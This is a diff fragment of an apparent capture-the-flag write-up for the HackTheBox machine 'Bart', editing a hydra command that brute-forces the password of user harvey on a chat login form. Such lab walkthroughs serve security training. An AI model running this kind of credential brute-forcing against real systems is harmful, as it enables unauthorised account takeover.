@@ -114,7 +114,7 @@ Looking at the code, it looks like the version running here removed the `registe
 ### Brute-Force Credentials (Optional)
  - Brute-force password for user `Harvey`.
 ```CSS
-hydra -l harvey -P /usr/share/wordlists/rockyou.txt internal-01.bart.htb http-form-post "/simple_chat/login_form.php:uname=^USER^&^passwd=^PASS^&submit=Login:Password"
+hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&^passwd=^PASS^&submit=Login:Password"
 ```
 
 
